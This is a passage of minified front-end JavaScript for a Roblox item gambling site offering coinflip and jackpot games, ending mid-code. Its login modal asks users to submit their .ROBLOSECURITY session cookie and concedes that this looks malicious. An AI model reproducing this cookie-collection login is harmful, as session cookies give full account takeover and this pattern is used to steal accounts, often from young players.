(window.webpackJsonp = window.webpackJsonp || []).push([
    [0],
    [, , , , , function(t, e, r) {
        "use strict";
        r.d(e, "k", (function() {
            return v
        })), r.d(e, "l", (function() {
            return y
        })), r.d(e, "e", (function() {
            return x
        })), r.d(e, "b", (function() {
            return w
        })), r.d(e, "r", (function() {
            return k
        })), r.d(e, "g", (function() {
            return C
        })), r.d(e, "h", (function() {
            return A
        })), r.d(e, "d", (function() {
            return j
        })), r.d(e, "q", (function() {
            return $
        })), r.d(e, "j", (function() {
            return O
        })), r.d(e, "s", (function() {
            return R
        })), r.d(e, "n", (function() {
            return E
        })), r.d(e, "p", (function() {
            return P
        })), r.d(e, "f", (function() {
            return T
        })), r.d(e, "c", (function() {
            return N
        })), r.d(e, "i", (function() {
            return U
        })), r.d(e, "o", (function() {
            return D
        })), r.d(e, "a", (function() {
            return B
        })), r.d(e, "m", (function() {
            return G
        }));
        r(19), r(55), r(56), r(21), r(17), r(29), r(57), r(40), r(225), r(180), r(65), r(69), r(41), r(30), r(49), r(50), r(34), r(26), r(280), r(35), r(42), r(281), r(43), r(48), r(282), r(59), r(228), r(229), r(230), r(31), r(58);
        var n = r(15),
            o = r(62),
            c = (r(8), r(2)),
            l = r(13),
            d = r(1);

        function f(object, t) {
            var e = Object.keys(object);
            if (Object.getOwnPropertySymbols) {
                var r = Object.getOwnPropertySymbols(object);
                t && (r = r.filter((function(t) {
                    return Object.getOwnPropertyDescriptor(object, t).enumerable
                }))), e.push.apply(e, r)
            }
            return e
        }

        function m(t) {
            for (var i = 1; i < arguments.length; i++) {
                var source = null != arguments[i] ? arguments[i] : {};
                i % 2 ? f(Object(source), !0).forEach((function(e) {
                    Object(l.a)(t, e, source[e])
                })) : Object.getOwnPropertyDescriptors ? Object.defineProperties(t, Object.getOwnPropertyDescriptors(source)) : f(Object(source)).forEach((function(e) {
                    Object.defineProperty(t, e, Object.getOwnPropertyDescriptor(source, e))
                }))
            }
            return t
        }

        function h(t, e) {
            var r;
            if ("undefined" == typeof Symbol || null == t[Symbol.iterator]) {
                if (Array.isArray(t) || (r = function(t, e) {
                        if (!t) return;
                        if ("string" == typeof t) return _(t, e);
                        var r = Object.prototype.toString.call(t).slice(8, -1);
                        "Object" === r && t.constructor && (r = t.constructor.name);
                        if ("Map" === r || "Set" === r) return Array.from(t);
                        if ("Arguments" === r || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(r)) return _(t, e)
                    }(t)) || e && t && "number" == typeof t.length) {
                    r && (t = r);
                    var i = 0,
                        n = function() {};
                    return {
                        s: n,
                        n: function() {
                            return i >= t.length ? {
                                done: !0
                            } : {
                                done: !1,
                                value: t[i++]
                            }
                        },
                        e: function(t) {
                            throw t
                        },
                        f: n
                    }
                }
                throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")
            }
            var o, c = !0,
                l = !1;
            return {
                s: function() {
                    r = t[Symbol.iterator]()
                },
                n: function() {
                    var t = r.next();
                    return c = t.done, t
                },
                e: function(t) {
                    l = !0, o = t
                },
                f: function() {
                    try {
                        c || null == r.return || r.return()
                    } finally {
                        if (l) throw o
                    }
                }
            }
        }

        function _(t, e) {
            (null == e || e > t.length) && (e = t.length);
            for (var i = 0, r = new Array(e); i < e; i++) r[i] = t[i];
            return r
        }

        function v(t) {
            d.default.config.errorHandler && d.default.config.errorHandler(t)
        }

        function y(t) {
            return t.$options && "function" == typeof t.$options.fetch && !t.$options.fetch.length
        }

        function x(t) {
            var e, r = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : [],
                n = t.$children || [],
                o = h(n);
            try {
                for (o.s(); !(e = o.n()).done;) {
                    var c = e.value;
                    c.$fetch ? r.push(c) : c.$children && x(c, r)
                }
            } catch (t) {
                o.e(t)
            } finally {
                o.f()
            }
            return r
        }

        function w(t, e) {
            if (e || !t.options.__hasNuxtData) {
                var r = t.options._originDataFn || t.options.data || function() {
                    return {}
                };
                t.options._originDataFn = r, t.options.data = function() {
                    var data = r.call(this, this);
                    return this.$ssrContext && (e = this.$ssrContext.asyncData[t.cid]), m(m({}, data), e)
                }, t.options.__hasNuxtData = !0, t._Ctor && t._Ctor.options && (t._Ctor.options.data = t.options.data)
            }
        }

        function k(t) {
            return t.options && t._Ctor === t || (t.options ? (t._Ctor = t, t.extendOptions = t.options) : (t = d.default.extend(t))._Ctor = t, !t.options.name && t.options.__file && (t.options.name = t.options.__file)), t
        }

        function C(t) {
            var e = arguments.length > 1 && void 0 !== arguments[1] && arguments[1],
                r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : "components";
            return Array.prototype.concat.apply([], t.matched.map((function(t, n) {
                return Object.keys(t[r]).map((function(o) {
                    return e && e.push(n), t[r][o]
                }))
            })))
        }

        function A(t) {
            var e = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
            return C(t, e, "instances")
        }

        function j(t, e) {
            return Array.prototype.concat.apply([], t.matched.map((function(t, r) {
                return Object.keys(t.components).reduce((function(n, o) {
                    return t.components[o] ? n.push(e(t.components[o], t.instances[o], t, o, r)) : delete t.components[o], n
                }), [])
            })))
        }

        function $(t, e) {
            return Promise.all(j(t, function() {
                var t = Object(c.a)(regeneratorRuntime.mark((function t(r, n, o, c) {
                    return regeneratorRuntime.wrap((function(t) {
                        for (;;) switch (t.prev = t.next) {
                            case 0:
                                if ("function" != typeof r || r.options) {
                                    t.next = 4;
                                    break
                                }
                                return t.next = 3, r();
                            case 3:
                                r = t.sent;
                            case 4:
                                return o.components[c] = r = k(r), t.abrupt("return", "function" == typeof e ? e(r, n, o, c) : r);
                            case 6:
                            case "end":
                                return t.stop()
                        }
                    }), t)
                })));
                return function(e, r, n, o) {
                    return t.apply(this, arguments)
                }
            }()))
        }

        function O(t) {
            return S.apply(this, arguments)
        }

        function S() {
            return (S = Object(c.a)(regeneratorRuntime.mark((function t(e) {
                return regeneratorRuntime.wrap((function(t) {
                    for (;;) switch (t.prev = t.next) {
                        case 0:
                            if (e) {
                                t.next = 2;
                                break
                            }
                            return t.abrupt("return");
                        case 2:
                            return t.next = 4, $(e);
                        case 4:
                            return t.abrupt("return", m(m({}, e), {}, {
                                meta: C(e).map((function(t, r) {
                                    return m(m({}, t.options.meta), (e.matched[r] || {}).meta)
                                }))
                            }));
                        case 5:
                        case "end":
                            return t.stop()
                    }
                }), t)
            })))).apply(this, arguments)
        }

        function R(t, e) {
            return I.apply(this, arguments)
        }

        function I() {
            return (I = Object(c.a)(regeneratorRuntime.mark((function t(e, r) {
                var c, l, d, f;
                return regeneratorRuntime.wrap((function(t) {
                    for (;;) switch (t.prev = t.next) {
                        case 0:
                            return e.context || (e.context = {
                                isStatic: !0,
                                isDev: !1,
                                isHMR: !1,
                                app: e,
                                store: e.store,
                                payload: r.payload,
                                error: r.error,
                                base: "/",
                                env: {
                                    BRAND_NAME: "RbxFlip",
                                    BRAND_URL: "https://rbxflip.com/",
                                    BRAND_TITLE: "RbxFlip | Roblox Coinflip & Jackpot",
                                    BRAND_DESCRIPTION: "Provably fair gambling through coinflip & jackpot using Roblox limiteds",
                                    BRAND_LOGO: "/img/logos/primary.png",
                                    API_URL: "http://localhost:8080",
                                    API_URL_BROWSER: "https://domain.com",
                                    WS_URL_BROWSER: "wss://rbxflip.com/ws/"
                                }
                            }, r.ssrContext && (e.context.ssrContext = r.ssrContext), e.context.redirect = function(t, path, r) {
                                if (t) {
                                    e.context._redirected = !0;
                                    var n = Object(o.a)(path);
                                    if ("number" == typeof t || "undefined" !== n && "object" !== n || (r = path || {}, path = t, n = Object(o.a)(path), t = 302), "object" === n && (path = e.router.resolve(path).route.fullPath), !/(^[.]{1,2}\/)|(^\/(?!\/))/.test(path)) throw path = W(path, r), window.location.replace(path), new Error("ERR_REDIRECT");
                                    e.context.next({
                                        path: path,
                                        query: r,
                                        status: t
                                    })
                                }
                            }, e.context.nuxtState = window.__NUXT__), t.next = 3, Promise.all([O(r.route), O(r.from)]);
                        case 3:
                            c = t.sent, l = Object(n.a)(c, 2), d = l[0], f = l[1], r.route && (e.context.route = d), r.from && (e.context.from = f), e.context.next = r.next, e.context._redirected = !1, e.context._errored = !1, e.context.isHMR = !1, e.context.params = e.context.route.params || {}, e.context.query = e.context.route.query || {};
                        case 15:
                        case "end":
                            return t.stop()
                    }
                }), t)
            })))).apply(this, arguments)
        }

        function E(t, e) {
            return !t.length || e._redirected || e._errored ? Promise.resolve() : P(t[0], e).then((function() {
                return E(t.slice(1), e)
            }))
        }

        function P(t, e) {
            var r;
            return (r = 2 === t.length ? new Promise((function(r) {
                t(e, (function(t, data) {
                    t && e.error(t), r(data = data || {})
                }))
            })) : t(e)) && r instanceof Promise && "function" == typeof r.then ? r : Promise.resolve(r)
        }

        function T(base, t) {
            var path = decodeURI(window.location.pathname);
            return "hash" === t ? window.location.hash.replace(/^#\//, "") : (base && (path.endsWith("/") ? path : path + "/").startsWith(base) && (path = path.slice(base.length)), (path || "/") + window.location.search + window.location.hash)
        }

        function N(t, e) {
            return function(t, e) {
                for (var r = new Array(t.length), i = 0; i < t.length; i++) "object" === Object(o.a)(t[i]) && (r[i] = new RegExp("^(?:" + t[i].pattern + ")$", z(e)));
                return function(e, n) {
                    for (var path = "", data = e || {}, o = (n || {}).pretty ? M : encodeURIComponent, c = 0; c < t.length; c++) {
                        var l = t[c];
                        if ("string" != typeof l) {
                            var d = data[l.name || "pathMatch"],
                                f = void 0;
                            if (null == d) {
                                if (l.optional) {
                                    l.partial && (path += l.prefix);
                                    continue
                                }
                                throw new TypeError('Expected "' + l.name + '" to be defined')
                            }
                            if (Array.isArray(d)) {
                                if (!l.repeat) throw new TypeError('Expected "' + l.name + '" to not repeat, but received `' + JSON.stringify(d) + "`");
                                if (0 === d.length) {
                                    if (l.optional) continue;
                                    throw new TypeError('Expected "' + l.name + '" to not be empty')
                                }
                                for (var m = 0; m < d.length; m++) {
                                    if (f = o(d[m]), !r[c].test(f)) throw new TypeError('Expected all "' + l.name + '" to match "' + l.pattern + '", but received `' + JSON.stringify(f) + "`");
                                    path += (0 === m ? l.prefix : l.delimiter) + f
                                }
                            } else {
                                if (f = l.asterisk ? M(d, !0) : o(d), !r[c].test(f)) throw new TypeError('Expected "' + l.name + '" to match "' + l.pattern + '", but received "' + f + '"');
                                path += l.prefix + f
                            }
                        } else path += l
                    }
                    return path
                }
            }(function(t, e) {
                var r, n = [],
                    o = 0,
                    c = 0,
                    path = "",
                    l = e && e.delimiter || "/";
                for (; null != (r = L.exec(t));) {
                    var d = r[0],
                        f = r[1],
                        m = r.index;
                    if (path += t.slice(c, m), c = m + d.length, f) path += f[1];
                    else {
                        var h = t[c],
                            _ = r[2],
                            v = r[3],
                            y = r[4],
                            x = r[5],
                            w = r[6],
                            k = r[7];
                        path && (n.push(path), path = "");
                        var C = null != _ && null != h && h !== _,
                            A = "+" === w || "*" === w,
                            j = "?" === w || "*" === w,
                            $ = r[2] || l,
                            pattern = y || x;
                        n.push({
                            name: v || o++,
                            prefix: _ || "",
                            delimiter: $,
                            optional: j,
                            repeat: A,
                            partial: C,
                            asterisk: Boolean(k),
                            pattern: pattern ? V(pattern) : k ? ".*" : "[^" + F($) + "]+?"
                        })
                    }
                }
                c < t.length && (path += t.substr(c));
                path && n.push(path);
                return n
            }(t, e), e)
        }

        function U(t, e) {
            var r = {},
                n = m(m({}, t), e);
            for (var o in n) String(t[o]) !== String(e[o]) && (r[o] = !0);
            return r
        }

        function D(t) {
            var e;
            if (t.message || "string" == typeof t) e = t.message || t;
            else try {
                e = JSON.stringify(t, null, 2)
            } catch (r) {
                e = "[".concat(t.constructor.name, "]")
            }
            return m(m({}, t), {}, {
                message: e,
                statusCode: t.statusCode || t.status || t.response && t.response.status || 500
            })
        }
        window.onNuxtReadyCbs = [], window.onNuxtReady = function(t) {
            window.onNuxtReadyCbs.push(t)
        };
        var L = new RegExp(["(\\\\.)", "([\\/.])?(?:(?:\\:(\\w+)(?:\\(((?:\\\\.|[^\\\\()])+)\\))?|\\(((?:\\\\.|[^\\\\()])+)\\))([+*?])?|(\\*))"].join("|"), "g");

        function M(t, e) {
            var r = e ? /[?#]/g : /[/?#]/g;
            return encodeURI(t).replace(r, (function(t) {
                return "%" + t.charCodeAt(0).toString(16).toUpperCase()
            }))
        }

        function F(t) {
            return t.replace(/([.+*?=^!:${}()[\]|/\\])/g, "\\$1")
        }

        function V(t) {
            return t.replace(/([=!:$/()])/g, "\\$1")
        }

        function z(t) {
            return t && t.sensitive ? "" : "i"
        }

        function W(t, e) {
            var r, o = t.indexOf("://"); - 1 !== o ? (r = t.substring(0, o), t = t.substring(o + 3)) : t.startsWith("//") && (t = t.substring(2));
            var c, l = t.split("/"),
                d = (r ? r + "://" : "//") + l.shift(),
                path = l.join("/");
            if ("" === path && 1 === l.length && (d += "/"), 2 === (l = path.split("#")).length) {
                var f = l,
                    m = Object(n.a)(f, 2);
                path = m[0], c = m[1]
            }
            return d += path ? "/" + path : "", e && "{}" !== JSON.stringify(e) && (d += (2 === t.split("?").length ? "&" : "?") + function(t) {
                return Object.keys(t).sort().map((function(e) {
                    var r = t[e];
                    return null == r ? "" : Array.isArray(r) ? r.slice().map((function(t) {
                        return [e, "=", t].join("")
                    })).join("&") : e + "=" + r
                })).filter(Boolean).join("&")
            }(e)), d += c ? "#" + c : ""
        }

        function B(t, e, r) {
            t.$options[e] || (t.$options[e] = []), t.$options[e].includes(r) || t.$options[e].push(r)
        }

        function J(path) {
            return path.replace(/\/+$/, "") || "/"
        }

        function G(t, e) {
            return J(t) === J(e)
        }
    }, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , function(t, e, r) {
        "use strict";
        r.r(e);
        r(44);
        var n = {
                components: {
                    MoonLoader: r(252).MoonLoader
                },
                props: {
                    color: {
                        type: String,
                        default: "#a0aec0"
                    },
                    size: {
                        type: Number,
                        default: 60
                    }
                }
            },
            o = (r(303), r(0)),
            component = Object(o.a)(n, (function() {
                var t = this.$createElement;
                this._self._c;
                return this._m(0)
            }), [function() {
                var t = this.$createElement,
                    e = this._self._c || t;
                return e("div", {
                    staticClass: "spinner"
                }, [e("div", {
                    staticClass: "load"
                })])
            }], !1, null, "9239ce76", null);
        e.default = component.exports
    }, function(t, e, r) {
        "use strict";
        r.d(e, "b", (function() {
            return aa
        })), r.d(e, "a", (function() {
            return Ft
        }));
        r(19), r(17), r(29), r(65), r(30), r(49), r(50), r(34), r(26), r(31), r(8);
        var n = r(2),
            o = r(13),
            c = r(1),
            l = r(250),
            d = r(187),
            f = r.n(d),
            m = r(72),
            h = r.n(m),
            _ = (r(21), r(15)),
            v = r(36),
            y = r(188),
            x = r(18);

        function w(object, t) {
            var e = Object.keys(object);
            if (Object.getOwnPropertySymbols) {
                var r = Object.getOwnPropertySymbols(object);
                t && (r = r.filter((function(t) {
                    return Object.getOwnPropertyDescriptor(object, t).enumerable
                }))), e.push.apply(e, r)
            }
            return e
        }
        var k = {
                computed: function(t) {
                    for (var i = 1; i < arguments.length; i++) {
                        var source = null != arguments[i] ? arguments[i] : {};
                        i % 2 ? w(Object(source), !0).forEach((function(e) {
                            Object(o.a)(t, e, source[e])
                        })) : Object.getOwnPropertyDescriptors ? Object.defineProperties(t, Object.getOwnPropertyDescriptors(source)) : w(Object(source)).forEach((function(e) {
                            Object.defineProperty(t, e, Object.getOwnPropertyDescriptor(source, e))
                        }))
                    }
                    return t
                }({}, Object(x.c)(["sortedCoinflips", "totalCoinflipsValue", "totalCoinflipsRAP"]))
            },
            C = (r(285), r(0)),
            A = Object(C.a)(k, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("div", {
                    staticClass: "coinflip"
                }, [r("div", {
                    staticClass: "coinflip__details"
                }, [r("div", {
                    staticClass: "detail"
                }, [r("div", {
                    staticClass: "detail__value"
                }, [t._v("R$ " + t._s(t._f("longNumber")(t.totalCoinflipsValue)))]), t._v(" "), r("label", {
                    staticClass: "detail__label"
                }, [t._v("Total Value")])]), t._v(" "), r("div", {
                    staticClass: "detail"
                }, [r("div", {
                    staticClass: "detail__value"
                }, [t._v("R$ " + t._s(t._f("longNumber")(t.totalCoinflipsRAP)))]), t._v(" "), r("label", {
                    staticClass: "detail__label"
                }, [t._v("Total RAP")])]), t._v(" "), r("div", {
                    staticClass: "detail"
                }, [r("div", {
                    staticClass: "detail__value"
                }, [t._v(t._s(t._f("longNumber")(t.sortedCoinflips.length)))]), t._v(" "), r("label", {
                    staticClass: "detail__label"
                }, [t._v("Active Games")])]), t._v(" "), r("div", {
                    staticClass: "detail buttons"
                }, [r("div", {
                    staticClass: "detail__button"
                }, [r("NuxtLink", {
                    staticClass: "btn btn-gray btn-pill",
                    attrs: {
                        to: "/bet",
                        tag: "button"
                    }
                }, [t._v("Create")])], 1), t._v(" "), r("div", {
                    staticClass: "detail__button"
                }, [r("NuxtLink", {
                    staticClass: "btn btn-blue btn-pill",
                    attrs: {
                        to: "/history",
                        tag: "button"
                    }
                }, [t._v("History")])], 1)])]), t._v(" "), r("CoinflipList", {
                    attrs: {
                        coinflips: t.sortedCoinflips
                    }
                })], 1)
            }), [], !1, null, "ce68ff7a", null),
            j = A.exports;
        installComponents(A, {
            CoinflipList: r(442).default
        });
        r(97), r(66);

        function $(object, t) {
            var e = Object.keys(object);
            if (Object.getOwnPropertySymbols) {
                var r = Object.getOwnPropertySymbols(object);
                t && (r = r.filter((function(t) {
                    return Object.getOwnPropertyDescriptor(object, t).enumerable
                }))), e.push.apply(e, r)
            }
            return e
        }

        function O(t) {
            for (var i = 1; i < arguments.length; i++) {
                var source = null != arguments[i] ? arguments[i] : {};
                i % 2 ? $(Object(source), !0).forEach((function(e) {
                    Object(o.a)(t, e, source[e])
                })) : Object.getOwnPropertyDescriptors ? Object.defineProperties(t, Object.getOwnPropertyDescriptors(source)) : $(Object(source)).forEach((function(e) {
                    Object.defineProperty(t, e, Object.getOwnPropertyDescriptor(source, e))
                }))
            }
            return t
        }
        var S = {
                data: function() {
                    return {
                        loadPercentage: 0,
                        componentMounted: !1,
                        rotateCircle: !1,
                        triggerAnimation: !1,
                        drawWinner: !1,
                        stopLoading: !0,
                        history: []
                    }
                },
                fetch: function() {
                    var t = this;
                    return Object(n.a)(regeneratorRuntime.mark((function e() {
                        var r, n;
                        return regeneratorRuntime.wrap((function(e) {
                            for (;;) switch (e.prev = e.next) {
                                case 0:
                                    return e.next = 2, t.$axios.$get("history/jackpots");
                                case 2:
                                    r = e.sent, n = r.data.jackpots, t.history = n;
                                case 5:
                                case "end":
                                    return e.stop()
                            }
                        }), e)
                    })))()
                },
                fetchOnServer: !1,
                watch: {
                    "jackpot.status": function() {
                        this.componentMounted && this.onStatusChanged()
                    }
                },
                computed: O(O(O({}, Object(x.d)(["jackpot"])), Object(x.c)(["sortedJackpotPlayers"])), {}, {
                    jackpotIsOver: function() {
                        return "Completed" == this.jackpot.status || "Cooldown" == this.jackpot.status
                    },
                    myEntry: function() {
                        var t = this;
                        return this.$auth.loggedIn ? this.jackpot.players.find((function(e) {
                            return e.userId == t.$auth.user._id
                        })) : null
                    },
                    isInJackpot: function() {
                        return null != this.myEntry
                    },
                    myTicketWinChance: function() {
                        return null != this.myEntry && this.myEntry.ticket.percentage
                    },
                    myTicketColor: function() {
                        return null != this.myEntry && this.myEntry.ticket.color
                    }
                }),
                methods: {
                    onStatusChanged: function() {
                        "Pending" == this.jackpot.status ? (this.drawWinner = !1, this.rotateCircle = !1, this.triggerAnimation = !1, this.stopLoading = !1, this.startLoading(this.jackpot.startedAt, this.jackpot.endedAt)) : "Completed" == this.jackpot.status ? (this.stopLoading || (this.stopLoading = !0, this.triggerAnimation = !0), this.rotateCircle = !0) : "Cooldown" == this.jackpot.status && (this.drawWinner = !0, this.rotateCircle = !0, this.triggerAnimation = !1, this.stopLoading = !1, this.startLoading(this.jackpot.startedAt, this.jackpot.endedAt))
                    },
                    startLoading: function(t, e) {
                        var r = this,
                            n = e - t,
                            o = e - Date.now(),
                            c = o / n;
                        o <= 0 || this.stopLoading ? this.loadPercentage = 0 : (this.loadPercentage = c, setTimeout((function() {
                            return r.startLoading(t, e)
                        }), 10))
                    }
                },
                mounted: function() {
                    this.componentMounted = !0, this.onStatusChanged()
                }
            },
            R = (r(293), Object(C.a)(S, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("div", {
                    staticClass: "jackpot"
                }, [r("div", {
                    staticClass: "jackpot__wheel"
                }, [r("JackpotWheel", {
                    ref: "jackpotWheel",
                    attrs: {
                        players: t.jackpot.players,
                        winner: t.jackpot.winner,
                        "total-value": t.jackpot.totalValue,
                        "random-number": t.jackpot.randomNumber,
                        "load-percentage": t.loadPercentage,
                        "trigger-animation": t.triggerAnimation,
                        "rotate-circle": t.rotateCircle
                    },
                    model: {
                        value: t.drawWinner,
                        callback: function(e) {
                            t.drawWinner = e
                        },
                        expression: "drawWinner"
                    }
                }), t._v(" "), r("div", [null != t.jackpot._id ? r("div", {
                    staticClass: "wheel__crypto-box"
                }, [r("div", {
                    directives: [{
                        name: "tooltip",
                        rawName: "v-tooltip",
                        value: {
                            content: t.jackpot._id,
                            trigger: "click"
                        },
                        expression: "{content: jackpot._id, trigger: 'click'}"
                    }],
                    staticClass: "crypto-box__value"
                }, [r("span", {
                    staticClass: "value__icon"
                }, [r("FontAwesomeIcon", {
                    attrs: {
                        icon: ["fas", "hashtag"]
                    }
                })], 1), t._v(" "), r("span", {
                    staticClass: "value__data"
                }, [t._v(t._s(t.jackpot._id.substring(0, 10)) + " ...")])]), t._v(" "), t.jackpotIsOver && t.drawWinner ? r("div", [r("div", {
                    directives: [{
                        name: "tooltip",
                        rawName: "v-tooltip",
                        value: {
                            content: t.jackpot.cryptoData.float,
                            trigger: "click"
                        },
                        expression: "{content: jackpot.cryptoData.float, trigger: 'click'}"
                    }],
                    staticClass: "crypto-box__value"
                }, [r("span", {
                    staticClass: "value__icon"
                }, [r("FontAwesomeIcon", {
                    attrs: {
                        icon: ["fas", "key"]
                    }
                })], 1), t._v(" "), r("span", {
                    staticClass: "value__data"
                }, [t._v(t._s(t.jackpot.cryptoData.secret))])])]) : t._e()]) : t._e(), t._v(" "), t.jackpotIsOver && t.drawWinner ? r("div", {
                    staticClass: "wheel__winner-box"
                }, [r("div", {
                    staticClass: "winner-box__details",
                    style: "color: " + t.$util.parseRGBA(t.jackpot.winner.ticket.color)
                }, [r("span", {
                    staticClass: "details__trophy"
                }, [r("FontAwesomeIcon", {
                    attrs: {
                        icon: ["fas", "trophy"]
                    }
                })], 1), t._v(" "), r("span", {
                    staticClass: "details__winner"
                }, [t._v(t._s(t.jackpot.winner.username))]), t._v(" "), r("span", {
                    staticClass: "details__trophy"
                }, [r("FontAwesomeIcon", {
                    attrs: {
                        icon: ["fas", "trophy"]
                    }
                })], 1), t._v(" "), r("div", {
                    staticClass: "details__info"
                }, [r("span", {
                    staticClass: "details__winner"
                }, [t._v(t._s(t._f("smallDecimal")(t.jackpot.winner.ticket.percentage)))]), t._v(" "), r("span", {
                    staticClass: "chance-box__percent"
                }, [t._v("%")])])])]) : t._e(), t._v(" "), t.isInJackpot && !t.drawWinner ? r("div", {
                    staticClass: "wheel__chance-box"
                }, [r("span", {
                    staticClass: "chance-box__heading"
                }, [t._v("Your win chance is")]), t._v(" "), r("span", {
                    staticClass: "chance-box__value",
                    style: "color: " + t.$util.parseRGBA(t.myTicketColor)
                }, [r("span", [t._v(t._s(t._f("smallDecimal")(t.myTicketWinChance)))]), t._v(" "), r("span", {
                    staticClass: "chance-box__percent"
                }, [t._v("%")])])]) : t._e()])], 1), t._v(" "), r("div", {
                    staticClass: "jackpot__data"
                }, [r("div", {
                    staticClass: "data__players"
                }, [r("div", [t._v("Players")]), t._v(" "), "Open" != t.jackpot.status && "Pending" != t.jackpot.status || t.isInJackpot ? t._e() : r("div", [r("NuxtLink", {
                    staticClass: "players__join btn btn-gray btn-pill btn-full",
                    attrs: {
                        to: "/deposit",
                        tag: "button"
                    }
                }, [t._v("Join")])], 1), t._v(" "), r("JackpotPlayersList", {
                    attrs: {
                        players: t.sortedJackpotPlayers
                    }
                })], 1), t._v(" "), r("div", {
                    staticClass: "data__history"
                }, [r("div", [t._v("History")]), t._v(" "), t.$fetchState.pending ? r("div", [r("Spinner")], 1) : r("div", [r("JackpotHistoryList", {
                    attrs: {
                        history: t.history
                    }
                })], 1)])])])
            }), [], !1, null, "0076445c", null)),
            I = R.exports;
        installComponents(R, {
            JackpotWheel: r(443).default,
            JackpotPlayersList: r(444).default,
            Spinner: r(51).default,
            JackpotHistoryList: r(445).default
        });
        var E = {
                name: "default",
                components: {
                    Coinflips: j,
                    Jackpot: I
                },
                data: function() {
                    return {
                        modalShowing: this.$route.meta.modalShowing,
                        announcement: null
                    }
                },
                watch: {
                    "$route.meta.modalShowing": function(t) {
                        this.modalShowing = t
                    },
                    "$route.meta.currentPage": function(t) {
                        this.setCurrentPage(t)
                    }
                },
                computed: Object(x.d)(["currentPage", "socket"]),
                methods: Object(x.b)(["setCurrentPage"]),
                created: function() {
                    var t = this.$route.meta,
                        e = t.currentPage;
                    t.modalShowing;
                    e && this.$store.commit("SET_CURRENT_PAGE", e)
                }
            },
            P = (r(309), Object(C.a)(E, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("div", [r("div", {
                    staticClass: "background"
                }), t._v(" "), r("div", {
                    staticClass: "layout",
                    class: {
                        modalShowing: t.modalShowing
                    }
                }, [r("Navbar"), t._v(" "), r("Chat"), t._v(" "), r("div", {
                    staticClass: "main"
                }, [r("div", {
                    staticClass: "main__pages"
                }, [t.announcement ? r("div", {
                    staticClass: "announcement"
                }, [r("h1", {
                    staticClass: "announcement__title"
                }, [t._v("\n                            " + t._s(t.announcement.title) + "\n                        ")]), t._v(" "), r("p", {
                    staticClass: "announcement__body"
                }, [t._v("\n                            " + t._s(t.announcement.body) + "\n                        ")])]) : t._e(), t._v(" "), t.socket.isConnected ? r("div", [r("transition", {
                    attrs: {
                        name: "slide-fade",
                        mode: "out-in"
                    }
                }, ["coinflips" == t.currentPage ? r("Coinflips", {
                    key: "coinflips",
                    staticClass: "page"
                }) : t._e(), t._v(" "), "jackpot" == t.currentPage ? r("Jackpot", {
                    key: "jackpot",
                    staticClass: "page"
                }) : t._e()], 1)], 1) : r("div", [r("Spinner")], 1)])]), t._v(" "), r("Footer")], 1), t._v(" "), r("transition", {
                    attrs: {
                        name: "bounce"
                    }
                }, [r("NuxtChild", {
                    attrs: {
                        name: "modal"
                    }
                })], 1)], 1)
            }), [], !1, null, "168b21d2", null)),
            T = P.exports;
        installComponents(P, {
            Navbar: r(423).default,
            Chat: r(424).default,
            Spinner: r(51).default,
            Footer: r(425).default
        });
        var N = {
                middleware: "admin",
                head: {
                    bodyAttrs: {
                        style: "overflow-y: auto !important"
                    }
                }
            },
            U = (r(323), Object(C.a)(N, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("div", [r("div", {
                    staticClass: "navbar"
                }, [r("Brand", {
                    attrs: {
                        "logo-width": "175px"
                    }
                }), t._v(" "), r("div", {
                    staticClass: "page-info"
                }, [r("h1", {
                    staticClass: "page-title"
                }, [t._v("Admin Panel")]), t._v(" "), r("NuxtLink", {
                    staticClass: "btn btn-gray btn-pill",
                    attrs: {
                        to: "/exchange"
                    }
                }, [r("span", [t._v("Exchange")])])], 1)], 1), t._v(" "), r("div", {
                    staticClass: "admin"
                }, [r("AdminOverviewWidget"), t._v(" "), r("AdminBotsWidget"), t._v(" "), r("AdminUsersWidget"), t._v(" "), r("AdminGiveawayWidget"), t._v(" "), r("AdminClaimsWidget")], 1)])
            }), [], !1, null, "74eea8ea", null)),
            D = U.exports;
        installComponents(U, {
            Brand: r(98).default,
            AdminOverviewWidget: r(426).default,
            AdminBotsWidget: r(427).default,
            AdminUsersWidget: r(428).default,
            AdminGiveawayWidget: r(429).default,
            AdminClaimsWidget: r(430).default
        });
        var L = {
                name: "LoginModal",
                middleware: "auth",
                auth: "guest",
                data: function() {
                    return {
                        disabled: !1,
                        headerText: "Link Your Roblox Account",
                        bodyText: "In order for RBXFlip to operate smoothly, we require that you provide us with your Roblox cookie, or other known as the .ROBLOSECURITY. While normally asking for such would be considered malicious, we assure you that RBXFlip not only will protect your security but never use it without your permission!",
                        login: {
                            credentials: ""
                        }
                    }
                },
                methods: {
                    linkAccount: function() {
                        var t = this;
                        return Object(n.a)(regeneratorRuntime.mark((function e() {
                            return regeneratorRuntime.wrap((function(e) {
                                for (;;) switch (e.prev = e.next) {
                                    case 0:
                                        return e.prev = 0, t.disabled = !0, e.next = 4, t.$auth.loginWith("local", {
                                            data: t.login
                                        });
                                    case 4:
                                        window.location.reload(), e.next = 12;
                                        break;
                                    case 7:
                                        e.prev = 7, e.t0 = e.catch(0), console.error(e.t0), t.$toast.error(e.t0.response ? e.t0.response.data.error : e.t0.message), t.disabled = !1;
                                    case 12:
                                        return e.prev = 12, e.finish(12);
                                    case 14:
                                    case "end":
                                        return e.stop()
                                }
                            }), e, null, [
                                [0, 7, 12, 14]
                            ])
                        })))()
                    }
                }
            },
            M = (r(341), Object(C.a)(L, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("ModalContainer", [r("div", {
                    staticClass: "login"
                }, [r("div", {
                    staticClass: "login__details"
                }, [r("div", {
                    staticClass: "details__header"
                }, [t._v(t._s(t.headerText))]), t._v(" "), r("div", {
                    staticClass: "details__body"
                }, [t._v(t._s(t.bodyText))])]), t._v(" "), r("form", {
                    staticClass: "login__form",
                    on: {
                        submit: function(e) {
